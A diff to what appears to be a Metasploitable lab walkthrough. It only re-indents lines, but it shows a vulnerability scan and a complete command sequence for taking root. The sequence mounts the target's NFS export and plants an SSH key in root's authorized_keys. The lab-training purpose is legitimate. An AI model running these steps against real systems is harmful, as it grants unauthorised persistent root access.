@@ -29,7 +29,8 @@ The following information shows the **Metasploitable walkthrough**
      
    Get the IP address, `# ifconfig`
    Use that IP_address and perform the following steps: 
-        1. Scanning
+        
+	1. Scanning
         
         2. Vulnerability identification/Enumeration
         
@@ -86,26 +87,26 @@ nmap -Pn --script vuln 192.168.1.105
 
    For this we need to generate the RSA key and kinda have to copy that key to that target machine using rpcbind and NFS (port 2049) mount the NFS export (for exporting), and add our key to the root user account's authorized_keys file.
       
-   **_# apt update
-       
-   # apt install rpcbind nfs-common
-	
-   # rpcinfo -p ip_address
-         
-   # showmount -e ip_address
-         
-   # ssh-keygen	//just press enter for the questions asked for default settings
-         
-   # mkdir /tmp/r00t
-        
-   # mount -t nfs ip_address:/ /tmp/r00t
-   
-   # cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
-   
-   # umount /tmp/r00t
-   
-   # ssh root@ip_address_**
-         
+	   **_# apt update
+
+	   # apt install rpcbind nfs-common
+
+	   # rpcinfo -p ip_address
+
+	   # showmount -e ip_address
+
+	   # ssh-keygen	//just press enter for the questions asked for default settings
+
+	   # mkdir /tmp/r00t
+
+	   # mount -t nfs ip_address:/ /tmp/r00t
+
+	   # cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
+
+	   # umount /tmp/r00t
+
+	   # ssh root@ip_address_**
+
          
 **_METHOD 3: SMB 445_**
 
